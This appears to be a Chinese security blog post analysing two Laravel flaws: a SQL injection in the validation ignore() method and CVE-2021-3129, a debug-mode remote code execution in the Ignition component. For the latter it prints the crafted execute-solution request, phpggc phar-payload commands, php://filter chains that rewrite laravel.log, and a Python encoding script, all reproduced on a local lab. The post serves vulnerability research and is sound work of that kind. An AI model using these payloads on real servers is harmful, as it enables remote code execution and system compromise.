<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Laravel漏洞合集 | Tree's Blog</title><meta name="author" content="Tree"><meta name="copyright" content="Tree"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Laravel漏洞合集SQL注入(ignore)漏洞描述： 该漏洞存在于Laravel的表单验证功能，漏洞函数为ignore()，漏洞文件位于&#x2F;vendor&#x2F;laravel&#x2F;ramework&#x2F;src&#x2F;Illuminate&#x2F;Validation&#x2F;Rules&#x2F;Unique.php。有时候开发者希望在进行字段唯一性验证时忽略">
<meta property="og:type" content="article">
<meta property="og:title" content="Laravel漏洞合集">
<meta property="og:url" content="http://example.com/2023/08/02/Laravel%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/index.html">
<meta property="og:site_name" content="Tree&#39;s Blog">
<meta property="og:description" content="Laravel漏洞合集SQL注入(ignore)漏洞描述： 该漏洞存在于Laravel的表单验证功能，漏洞函数为ignore()，漏洞文件位于&#x2F;vendor&#x2F;laravel&#x2F;ramework&#x2F;src&#x2F;Illuminate&#x2F;Validation&#x2F;Rules&#x2F;Unique.php。有时候开发者希望在进行字段唯一性验证时忽略">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/todis21/image/main/wallhaven-5gm5p5_2560x1440.png">
<meta property="article:published_time" content="2023-08-02T13:51:54.000Z">
<meta property="article:modified_time" content="2023-08-02T14:00:38.801Z">
<meta property="article:author" content="Tree">
<meta property="article:tag" content="PHP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/todis21/image/main/wallhaven-5gm5p5_2560x1440.png"><link rel="shortcut icon" href="/img/favicon.jfif"><link rel="canonical" href="http://example.com/2023/08/02/Laravel%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Laravel漏洞合集',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-08-02 22:00:38'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/bg.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.jfif" onerror="onerror=null;src='/img/404.png'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">67</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/todis21/image/main/wallhaven-5gm5p5_2560x1440.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Tree's Blog"><span class="site-name">Tree's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Laravel漏洞合集</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-02T13:51:54.000Z" title="发表于 2023-08-02 21:51:54">2023-08-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-02T14:00:38.801Z" title="更新于 2023-08-02 22:00:38">2023-08-02</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Laravel漏洞合集"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Laravel漏洞合集"><a href="#Laravel漏洞合集" class="headerlink" title="Laravel漏洞合集"></a>Laravel漏洞合集</h1><h2 id="SQL注入-ignore"><a href="#SQL注入-ignore" class="headerlink" title="SQL注入(ignore)"></a>SQL注入(ignore)</h2><p>漏洞描述：</p>
<p>该漏洞存在于Laravel的表单验证功能，漏洞函数为ignore()，漏洞文件位于&#x2F;vendor&#x2F;laravel&#x2F;ramework&#x2F;src&#x2F;Illuminate&#x2F;Validation&#x2F;Rules&#x2F;Unique.php。有时候开发者希望在进行字段唯一性验证时忽略指定字段以及字段值，通常会调用Rule类的ignore方法。该方法有两个参数，第一个参数为字段值，第二个参数为字段名，当字段名为空时，默认字段名为“id”。如果用户可以控制ignore()方法的参数值，就会产生SQL注入漏洞。漏洞影响版本&lt;&#x3D;5.8.5</p>
<p>查看官方修改：</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230717104547143.png" alt="image-20230717104547143"></p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230717111129726.png" alt="image-20230717111129726"></p>
<p>发现在<code>ignore</code>值获取的过程中添加了<code>addslashes()</code>过滤</p>
<p>测试环境搭建：</p>
<p>新建一个控制器：<code>\app\Http\Controllers\TestController.php</code></p>
<pre><code class="php">&lt;?php
namespace App\Http\Controllers;
use Illuminate\Http\Request;
use Illuminate\Validation\Rule;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\DB;
class TestController extends Controller
&#123;
    public function index(Request $request)
    &#123;
        $validator = Validator::make($request-&gt;input(), [
            &#39;username&#39; =&gt; [
                &#39;required&#39;,
                Rule::unique(&quot;users&quot;)-&gt;ignore($request-&gt;input(&quot;id&quot;))
            ],
        ]);
        dump($validator-&gt;fails());
    &#125;
&#125;
</code></pre>
<p>在该index方法内部，首先创建了一个验证器实例$validator。验证器Validator::make()用于验证请求的输入数据是否符合指定的规则。</p>
<p>在这个例子中，Validator使用了make()方法来创建一个验证器实例，并将request-&gt;input()作为要验证的数据传递进去。验证器根据指定的规则对输入数据进行验证。在这里，验证规则是”username”字段是必需的（required），并且在数据库表”users”中是唯一的（unique）。使用了Rule::unique()方法来设置这个规则，并通过ignore()方法忽略了当前请求输入中的”id”字段的值。</p>
<p>最后，使用dump()函数输出$validator-&gt;fails()的结果。</p>
<p>在<code>routes/web.php</code>添加路由：</p>
<pre><code>Route::any(&quot;/&quot;,&quot;TestController@index&quot;);
</code></pre>
<p>最后在<code>.env</code>配置好数据库连接信息</p>
<p>在5.7.0的版本中的对应代码：<code>/vendor/laravel/ramework/src/Illuminate/Validation/Rules/Unique.php</code></p>
<pre><code class="php">public function ignore($id, $idColumn = null)
    &#123;
        if ($id instanceof Model) &#123;
            return $this-&gt;ignoreModel($id, $idColumn);
        &#125;

        $this-&gt;ignore = $id;
        $this-&gt;idColumn = $idColumn ?? &#39;id&#39;;

        return $this;
    &#125;

public function __toString()
    &#123;
        return rtrim(sprintf(&#39;unique:%s,%s,%s,%s,%s&#39;,
            $this-&gt;table,
            $this-&gt;column,
            $this-&gt;ignore ? &#39;&quot;&#39;.$this-&gt;ignore.&#39;&quot;&#39; : &#39;NULL&#39;,
            $this-&gt;idColumn,
            $this-&gt;formatWheres()
        ), &#39;,&#39;);
    &#125;
</code></pre>
<p>在这两个方法开始的地方下断点调试</p>
<pre><code>/username=admin&amp;id=2
</code></pre>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718165536832.png" alt="image-20230718165536832"></p>
<p><code>$this-&gt;ignore</code>直接获取到请求传来的<code>$id</code>值</p>
<p>之后会走到这个类下的__toString方法，这里也只是对 <code>$this-&gt;ignore</code>是否为空的处理，然后构造出<code>unique:users,NULL,&quot;2&quot;,id</code></p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718170055180.png" alt="image-20230718170055180"></p>
<p>然后回到构造函数：<code>$validator-&gt;fails()</code>跟进：</p>
<pre><code class="php">public function fails()
    &#123;
        return ! $this-&gt;passes();
    &#125;
</code></pre>
<p>继续跟进：passes()</p>
<p>这里存在一个二维数组rules的遍历，然后调用了validateAttribute，跟进<code>validateAttribute</code></p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718171036378.png" alt="image-20230718171036378"></p>
<p>validateAttribute方法的最后，会根据rule的内容进行调用validate开头的方法，这里会调用到validateUnique方法</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718171821430.png" alt="image-20230718171821430"></p>
<p>在<code>validateUnique</code>方法的最后，会调用一个getCount方法，这个方法是用来判断唯一性的，说明里面存在sql执行，跟进查看</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718172746191.png" alt="image-20230718172746191"></p>
<p>在这个方法中，前面部分是构建sql语句的，再跟进<code>count()</code>,猜测这里是执行sql语句的地方</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718173031435.png" alt="image-20230718173031435"></p>
<p>再这个方法里只有一行,继续往下跟进</p>
<pre><code>public function count($columns = &#39;*&#39;)
    &#123;
        return (int) $this-&gt;aggregate(__FUNCTION__, Arr::wrap($columns));
    &#125;
</code></pre>
<p>跟进到<code>compileSelect</code>,得到sql语句,其中<code>?</code>是占位符</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718174033102.png" alt="image-20230718174033102"></p>
<p>得到sql语句后返回，返回到<code>select()</code></p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718174350206.png" alt="image-20230718174350206"></p>
<p>在这个函数中<code>bindValues</code>方法对sql语句的占位符绑定了数据，然后执行查询，返回执行数据</p>
<p>注入：</p>
<p>注入通常是对键名 进行带入, 如果带入进键值的话, 没有任何效果, 这里关键的突破点就是 ignore函数中的 idColumn 变量, 以及 toString() 在处理 ignore中的处理方式</p>
<p>上面传入<code>username=admin&amp;id=1</code>时，得到的sql语句为</p>
<pre><code>select count(*) as aggregate from `users` where `username` = ? and `id` = ?
</code></pre>
<p>当传入<code>username=admin&amp;id=1&quot;,&quot;aaa&quot;,&quot;</code>时:</p>
<pre><code>select count(*) as aggregate from `users` where `username` = ? and `aaa` &lt;&gt; ? and `` = ?
</code></pre>
<p>在parse()函数解析id的值时，将<code>1&quot;,&quot;aaa&quot;,&quot;</code>分开了</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718202447714.png" alt="image-20230718202447714"></p>
<p>然后覆盖了$idColumn</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718203016018.png" alt="image-20230718203016018"></p>
<p>注入后出现报错</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718203839207.png" alt="image-20230718203839207"></p>
<p>是注入了，但是我无法将其利用，太菜了</p>
<h2 id="CVE-2021-3129-debug-rce"><a href="#CVE-2021-3129-debug-rce" class="headerlink" title="CVE-2021-3129(debug rce)"></a>CVE-2021-3129(debug rce)</h2><p>影响版本：Laravel &lt;&#x3D; 8.4.2&amp;&amp;facade ignition 组件 &lt; &#x3D;2.5.1</p>
<p>简介：</p>
<p>当Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。</p>
<p>查看更新，对比laravel的8.4.2和8.4.3版本，并没发现什么重要的修改</p>
<p>查看ignition的更新 ，对比2.5.1和2.5.2版本</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230714153223899.png" alt="image-20230714153223899"></p>
<p>在<code>src/Solutions/MakeViewVariableOptionalSolution.php</code>修改了两个函数，其中<code>makeOptional</code>函数添加了对**$parameters[‘viewFile’]**的安全过滤</p>
<p>修改前：</p>
<pre><code class="php">public function makeOptional(array $parameters = [])
    &#123;
        $originalContents = file_get_contents($parameters[&#39;viewFile&#39;]);
        $newContents = str_replace(&#39;$&#39;.$parameters[&#39;variableName&#39;], &#39;$&#39;.$parameters[&#39;variableName&#39;].&quot; ?? &#39;&#39;&quot;, $originalContents);

        $originalTokens = token_get_all(Blade::compileString($originalContents));
        $newTokens = token_get_all(Blade::compileString($newContents));

        $expectedTokens = $this-&gt;generateExpectedTokens($originalTokens, $parameters[&#39;variableName&#39;]);

        if ($expectedTokens !== $newTokens) &#123;
            return false;
        &#125;
</code></pre>
<p>漏洞就出现在函数的第一行<code>file_get_contents($parameters[&#39;viewFile&#39;])</code>  这个数组是由函数的参数获取,后面存在一个内容替换，根据<code>$</code>，可以猜测这个是一个变量名，将<code>$变量名</code>替换为<code>$变量名 ?? &#39;&#39;</code></p>
<p>查看这个函数被调用的地方，就在这个函数的上方，发现有两个</p>
<pre><code class="php">public function isRunnable(array $parameters = [])
    &#123;
        return $this-&gt;makeOptional($this-&gt;getRunParameters()) !== false;
    &#125;

    public function run(array $parameters = [])
    &#123;
        $output = $this-&gt;makeOptional($parameters);
        if ($output !== false) &#123;
            file_put_contents($parameters[&#39;viewFile&#39;], $output);
        &#125;
    &#125;
</code></pre>
<p>先分析<code>isRunnable</code>这里的<code>makeOptional</code>的参数是<code>$this-&gt;getRunParameters()</code>的返回值，跟进发现,它直接获取这个类的属性值，属性的赋值在构造函数中</p>
<pre><code class="php">public function getRunParameters(): array
    &#123;
        return [
            &#39;variableName&#39; =&gt; $this-&gt;variableName,
            &#39;viewFile&#39; =&gt; $this-&gt;viewFile,
        ];
    &#125;

public function __construct($variableName = null, $viewFile = null)
    &#123;
        $this-&gt;variableName = $variableName;
        $this-&gt;viewFile = $viewFile;
    &#125;
</code></pre>
<p>再分析<code>run</code>方法</p>
<pre><code class="php">public function run(array $parameters = [])
    &#123;
        $output = $this-&gt;makeOptional($parameters);
        if ($output !== false) &#123;
            file_put_contents($parameters[&#39;viewFile&#39;], $output);
        &#125;
    &#125;
</code></pre>
<p>这个第一句就调用了<code>makeOptional</code>,参数也是直接来自run的参数，而且后面还存在一个<code>file_put_contents</code></p>
<p>大概的意思是从makeOptional()获取文件的内容然后修改，然后在run()中调用<code>file_put_contents</code>将修改后的内容重新写回到该文件</p>
<p>下一步直接找调用<code>run()</code>的地方，直接找到<code>vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php</code></p>
<pre><code class="php">class ExecuteSolutionController
&#123;
    use ValidatesRequests;
    public function __invoke(
        ExecuteSolutionRequest $request,
        SolutionProviderRepository $solutionProviderRepository
    ) &#123;
        $solution = $request-&gt;getRunnableSolution();

        $solution-&gt;run($request-&gt;get(&#39;parameters&#39;, []));

        return response(&#39;&#39;);
    &#125;
&#125;
</code></pre>
<p>首先要在<code>getRunnableSolution()</code>方法获取类，再执行这个类的run方法</p>
<p>可以看到run的参数来自<code>$request-&gt;get(&#39;parameters&#39;, [])</code>,从字面意思来看，似乎是从一个请求参数中获取名为<code>parameters</code>的数组</p>
<p>所在的函数是<code>__invoke</code>是个魔术函数，当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。</p>
<p>翻找开发文档：<a target="_blank" rel="noopener" href="https://laravelacademy.org/post/21973">https://laravelacademy.org/post/21973</a></p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230714163703599.png" alt="image-20230714163703599"></p>
<p>通过这个开发文档可以知道，这个<code>ExecuteSolutionController</code>是一个单一控制器，果断搜索这个类的名字</p>
<p>找到：<code>vendor/facade/ignition/src/IgnitionServiceProvider.php</code></p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230714164022360.png" alt="image-20230714164022360"></p>
<p>在这里基本可以知道数据包</p>
<pre><code>POST /.../execute-solution
</code></pre>
<p>但是其中的<code>...</code>还未知</p>
<p>到这里思路就断了，回头查看，这个类的函数都在<code>facade/ignition</code>下，就是laravel的一个组件</p>
<p>这个组件的作用：（翻译后的）</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230714162243708.png" alt="image-20230714162243708"></p>
<p>搞个报错应该就能触发组件里的类和方法了，但是错误有很多种，组件里面有对不同错误进行处理的类，根据出现漏洞的类的类名<code>MakeViewVariableOptionalSolution.php</code> 可以知道这个错误和View相关，再根据上面提到的<strong>变量名替换</strong> ，可以知道当View内的文件引用一个未定义的模板</p>
<p>即可触发这个类的对应方法，前提是开启了debug</p>
<p>根据开发文档，在<code>resources/view/</code>里添加了一个模板，命名为hello.blade.php</p>
<pre><code class="php">&lt;html&gt;
&lt;body&gt;&lt;h1&gt;hello, &#123;&#123; $name &#125;&#125;&lt;/h1&gt;&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>添加路由：<code>routes/web.php</code></p>
<pre><code class="php">Route::get(&#39;/hello&#39;, function () &#123;
    return view(&#39;hello&#39;);
&#125;);
</code></pre>
<p>然后访问<code>http://127.0.0.1/hello</code>,出现报错，并且出现出现变量名替换</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230714175756477.png" alt="image-20230714175756477"></p>
<p>点击<code>Make variable optional</code>就你走到漏洞出现的地方,这里进行抓包：</p>
<pre><code class="yaml">POST /_ignition/execute-solution HTTP/1.1
Host: 192.168.0.121
Content-Length: 198
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.121
Referer: http://192.168.0.121/hello
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie:  XDEBUG_SESSION=PHPSTORM; 
Connection: close

&#123;&quot;solution&quot;:&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,&quot;parameters&quot;:&#123;&quot;variableName&quot;:&quot;name&quot;,&quot;viewFile&quot;:&quot;D:\\phpstudy_pro\\WWW\\laravel-8.4.2\\resources\\views\\hello.blade.php&quot;&#125;&#125;
</code></pre>
<p>可以看到POST里面存在<code>parameters</code> 参数，并且<code>solution</code>也指向了<code>MakeViewVariableOptionalSolution</code>这个类</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230715141049157.png" alt="image-20230715141049157"></p>
<p>参数传递解决，下一步解决file_get_contents和file_put_contents的利用，这里的这两个函数的参数，只能控制第一个参数，就是文件名，这里可以利用伪协议</p>
<p>测试phar反序列化 ， 使用.&#x2F;phpggc生成一个phar.log    ,这里的依赖存在monolog,所以用这条链</p>
<pre><code>php -d&#39;phar.readonly=0&#39; ./phpggc monolog/rce1 system calc --phar phar -o phar.log
</code></pre>
<p>修改数据表</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230716170214432.png" alt="image-20230716170214432"></p>
<p>发包：</p>
<p>在file_get_contents触发了反序列化</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230716170340480.png" alt="image-20230716170340480"></p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230716170532868.png" alt="image-20230716170532868"></p>
<p>这个有个大前提，这个phar文件必须在受害者服务器上，而且是已知路径，正常来说，如果不存在文件上传，服务器上面是不可能存在这个phar文件</p>
<p>这里利用file_put_contents 使用php伪协议php:&#x2F;&#x2F;filter&#x2F;write达到控制laravel.log内容的效果。首先要想利用laravel.log，先清空log内容。可能会想到一直base64 decode。直到都为不可见字符解码清空。但是这个做法会有问题。因为base64在解码的时候如果”&#x3D;”后面还有内容则会报错。大佬的做法是utf-8转utf-16 然后quoted-printable编码 然后utf-16转utf-8 完成上述操作后log中所有字符转为不可见字符，最后base64 decode即可。</p>
<pre><code>php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
</code></pre>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230716172359114.png" alt="image-20230716172359114"></p>
<p>修改前的laravel.log</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230716172431556.png" alt="image-20230716172431556"></p>
<p>发包后：</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230716172511858.png" alt="image-20230716172511858"></p>
<p>下一步就是将phar的内容写入log文件里</p>
<p>生成POC</p>
<pre><code>php -d &quot;phar.readonly=0&quot; ./phpggc Laravel/RCE5 &quot;phpinfo();&quot; --phar phar -o php://output | base64 -w 0 | python -c &quot;import sys;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in sys.stdin.read()]).upper())&quot;
</code></pre>
<p>因为win系统没有base64命令，所以写成下面的python脚本</p>
<pre><code class="python">import subprocess
import base64

# 执行第一步命令并获取输出结果
cmd1 = &#39;D:\\phpstudy_pro\\Extensions\\php\\php7.4.30nts\\php -d &quot;phar.readonly=0&quot; ./phpggc Laravel/RCE5 &quot;phpinfo();&quot; --phar phar -o phar.log&#39;
p1 = subprocess.Popen(cmd1, shell=True, stdout=subprocess.PIPE)
output1, _ = p1.communicate()

# print(output1)
# 读取日志文件内容
with open(&#39;phar.log&#39;, &#39;rb&#39;) as f:
    log_content = f.read()

# 将日志内容进行Base64编码
base64_output = base64.b64encode(log_content).decode()
# print(base64_output)
# 将Base64编码后的结果转换为大写十六进制形式，每个字符前添加&quot;=&quot;符号
hex_output = &#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in base64_output]).upper()
print(hex_output)
</code></pre>
<p>将生成的payload发送过去，然后报错，记录在log里面</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718091831933.png" alt="image-20230718091831933"></p>
<p>然后输入下面的伪协议进行解密：</p>
<pre><code>php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
</code></pre>
<p>发现解密出错了：</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718092049976.png" alt="image-20230718092049976"></p>
<p>查看日志发现是<code>convert.iconv.utf-16le.utf-8</code>这一步解密出错了，这个过滤器的报错很容易理解，它是把两个字符变成一个字符</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718092240244.png" alt="image-20230718092240244"></p>
<p>因此如果不是偶数个字符的话，就会报错，说明经过<code>convert.quoted-printable-decode</code>之后，日志中的字符数正好是奇数个，因此会报错。这时候我们需要想办法改一下在进行iconv的时候日志中字符的数量</p>
<p>查看解密前的log会发现，log里面记录着两次完整的payload， 还有一次是部分payload 而且是前面的部分,大概长这样</p>
<pre><code>[时间] [报错信息字符串] viewFile的值 [报错信息字符串] viewFile的值 [报错信息字符串] 
...
[报错信息字符串] 部分viewFile的值 [报错信息字符串]
...
</code></pre>
<p>如果我们想改变log长度的奇偶性，必须在payload前面添加字符，因为在前面添加一个字符，相当于整个log添加了3个字符，这样就能改变奇偶性，如果在paylaod的后面加，相当于整个log添加了2个字符奇偶性不变</p>
<p>当我们在前面添加了一个字符之后，重新解密，发现convert.quoted-printable-decode出错了，查看解密前的结果</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718095615248.png" alt="image-20230718095615248"></p>
<p>这里参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_22146195/article/details/107500750%E4%BA%86%E8%A7%A3Quoted-printable">https://blog.csdn.net/qq_22146195/article/details/107500750了解Quoted-printable</a> 编码</p>
<p>发现，当我们不加上’A’的时候是这样的 <code>file_get_contents(&#39;=50=00=44=00=39...&#39;)</code>    刚好可以解密，当加了一个’A’之后会挤掉了最后的9，这样最后是<code>=3</code>了，printable不能正好匹配了。因此改进的办法就很简单了，需要加三个A这里就会变成这样<code>AAA=50=00=44=00</code>和一开始这种情况（这时候是奇数个）<code>=50=00=44=00=39</code>相比</p>
<p>进行convert.quoted-printable-decode过滤器处理之后，一开始是5个字符，现在是7个字符，相当于增加得是2个字符，奇偶性还是没变。同样的道理，即使再添加3个字符也是一样，解密后，奇偶性还是没变</p>
<p>接下来单纯得想办法在前面或者后面增加A应该都不太行，解决办法就是额外再请求一条AA，让一开始payload不加A的时候就是偶数个，而不是奇数个</p>
